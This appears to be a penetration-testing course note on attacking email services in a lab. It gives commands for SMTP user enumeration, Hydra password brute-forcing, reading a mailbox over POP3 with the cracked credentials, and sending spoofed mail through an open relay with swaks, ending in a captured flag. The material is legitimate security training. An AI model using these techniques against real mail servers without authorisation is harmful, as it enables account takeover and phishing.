## ID
116

## Module
Attacking Common Services

## Kind
notes

## Title
Section 15 — Attacking Email Services

## Description
Enumerate SMTP, POP3, and IMAP services; discover valid users via VRFY/EXPN/RCPT TO; brute‑force passwords; read emails via POP3; and test for open relay misconfigurations.

## Tags
smtp, pop3, email, enumeration, brute-force, open-relay, swaks

## Commands
- host -t MX <DOMAIN>
- dig mx <DOMAIN>
- nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <TARGET>
- smtp-user-enum -M RCPT -U <USERLIST> -D <DOMAIN> -t <TARGET>
- hydra -l <EMAIL> -P <PASSFILE> -f <TARGET> smtp
- telnet <TARGET> 110
- swaks --from <SPOOFED> --to <REAL> --header 'Subject: ...' --body '...' --server <TARGET>

## What This Section Covers
Email services are critical targets. Attackers can enumerate valid users via SMTP commands, brute‑force authentication, read mailboxes over POP3 (often with weak passwords), and abuse open relays to send phishing emails. The lab demonstrates finding a valid user, cracking the password, and retrieving a flag from an email.

## Methodology

1. **Identify mail servers** – Query MX records for the target domain.
2. **Port scan** – Check SMTP (25, 465, 587), POP3 (110, 995), IMAP (143, 993).
3. **Enumerate users** – Use `smtp-user-enum` with RCPT TO method (most reliable).
4. **Password brute‑force** – Hydra against SMTP (use full email as login).
5. **Access mailbox** – Connect to POP3 (or IMAP) with valid credentials, list messages, retrieve flag.
6. **Test open relay** – Nmap script or `swaks` to see if the server forwards mail without auth.

## Multi‑step Workflow

```bash
# Step 1 – MX record lookup
host -t MX inlanefreight.htb
# or
dig mx inlanefreight.htb

# Step 2 – Port scan
sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 10.129.203.15

# Step 3 – SMTP user enumeration (RCPT TO method)
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -D inlanefreight.htb -t 10.129.203.15
# Output shows "marlin" exists

# Step 4 – Brute‑force password for marlin@inlanefreight.htb
hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f 10.129.203.15 smtp
# Found password: poohbear

# Step 5 – Read mail via POP3
telnet 10.129.203.15 110
USER marlin
PASS poohbear
LIST
RETR 1
# Flag found in email content: HTB{w34k_p4$$w0rd}
QUIT

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|common-services]]  
← [[14-dns-latest-vulns]] | [[16-email-latest-vulns]] →
<!-- AUTO-LINKS-END -->
